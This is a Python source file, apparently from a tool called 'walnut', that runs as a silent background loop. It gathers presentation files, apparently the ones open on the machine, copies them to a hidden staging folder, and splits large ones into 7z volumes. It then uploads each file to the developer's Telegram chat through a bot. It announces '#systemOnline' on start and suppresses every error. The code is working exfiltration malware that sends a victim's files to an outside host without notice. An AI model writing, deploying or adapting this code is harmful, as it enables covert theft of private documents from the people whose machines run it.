import asyncio
import hashlib
import time
from pathlib import Path

import multivolumefile
import py7zr
from async_lru import alru_cache
from telegram import Bot
from telegram.constants import ParseMode

from walnut.env import env
from walnut.tools import get_presentation
from walnut.utilities import escape_markdown, get_special_folder

bot = Bot(token=env["PPT_TELEGRAM_BOT_TOKEN"])
db = get_special_folder("walnut").joinpath("DB")
securePlace = get_special_folder("walnut").joinpath("securePlace")
db.mkdir(parents=True, exist_ok=True)
securePlace.mkdir(parents=True, exist_ok=True)
session = []

MAX_FILE_LIMIT = 25 * 1024 * 1024
RUN_EVERY_SECONDS = 3


@alru_cache(maxsize=64)
async def calculate_file_hash(path: Path):
    hash = hashlib.sha1()
    with path.open("rb") as file:
        for chunk in iter(lambda: file.read(4096), b""):
            hash.update(chunk)
    return hash.hexdigest()


@alru_cache(maxsize=64)
async def check_exist_database(path: Path, create=False):
    fileHash = await calculate_file_hash(path)
    dbPath = db.joinpath(fileHash[:2], fileHash)
    if create:
        dbPath.parent.mkdir(exist_ok=True, parents=True)
        dbPath.write_text(str(int(time.time())))
        return True
    return dbPath.exists()


async def split_file_into_chunks(path: Path):
    fileHash = await calculate_file_hash(path)
    target = securePlace.joinpath(fileHash)
    target.mkdir(exist_ok=True, parents=True)

    with multivolumefile.open(
        target.joinpath(f"{path.name}.7z"), mode="wb", volume=int(MAX_FILE_LIMIT / 2)
    ) as targetArchive:
        with py7zr.SevenZipFile(
            targetArchive, "w", filters=[{"id": py7zr.FILTER_COPY}]
        ) as archive:
            archive.write(path, path.name)


async def copy_file_to_location(path: Path):
    fileHash = await calculate_file_hash(path)
    target = securePlace.joinpath(fileHash)
    target.mkdir(exist_ok=True, parents=True)
    target.joinpath(path.name).write_bytes(path.read_bytes())


async def copy_to_secure_location(activePresentation):
    global session
    for path in activePresentation:
        if str(path) in session:
            continue
        fileSize = path.stat().st_size
        if not await check_exist_database(path):
            if fileSize > MAX_FILE_LIMIT:
                await split_file_into_chunks(path)
            else:
                await copy_file_to_location(path)
            session.append(str(path))
            await check_exist_database(path, create=True)
        else:
            session.append(str(path))


async def clear_upload_queue():
    for folderPath in securePlace.iterdir():
        if not folderPath.is_dir():
            continue

        filesList = [
            filePath for filePath in folderPath.iterdir() if filePath.is_file()
        ]

        if not filesList:
            folderPath.rmdir()
            continue

        if len(filesList) == 1:
            with filesList[0].open("rb") as openedFile:
                await bot.send_document(
                    chat_id=int(env["DEVELOPER_TELEGRAM_ID"]),
                    document=openedFile,
                    caption=f"> {escape_markdown(filesList[0].name)}\n\\#{escape_markdown(folderPath.name)}",
                    parse_mode=ParseMode.MARKDOWN_V2,
                    write_timeout=360,
                    read_timeout=360,
                )
            filesList[0].unlink()
        else:
            for filePath in filesList:
                fileName = ".".join(filesList[0].name.split(".")[:-2])
                with filePath.open("rb") as openedFile:
                    fileChunk = filePath.name.split(".")[-1]
                    await bot.send_document(
                        chat_id=int(env["DEVELOPER_TELEGRAM_ID"]),
                        document=openedFile,
                        caption=f"> {fileChunk}\n\\#{escape_markdown(folderPath.name)}\n> {escape_markdown(fileName)}",
                        parse_mode=ParseMode.MARKDOWN_V2,
                        write_timeout=360,
                        read_timeout=360,
                    )
                filePath.unlink()

        try:
            folderPath.rmdir()
        except Exception:
            pass


async def do_upload_action():
    presentations = get_presentation()
    await copy_to_secure_location(presentations)
    await clear_upload_queue()


async def _main():
    await bot.send_message(int(env["DEVELOPER_TELEGRAM_ID"]), "#systemOnline")
    checkFile = get_special_folder("walnut").joinpath("presentation.pause")
    while True:
        await asyncio.sleep(RUN_EVERY_SECONDS / 3)
        try:
            if not checkFile.exists():
                await do_upload_action()
        except Exception:
            pass
        await asyncio.sleep(RUN_EVERY_SECONDS / 3)
        await asyncio.sleep(RUN_EVERY_SECONDS / 3)


def main():
    asyncio.run(_main())

if __name__ == "__main__":
    main()
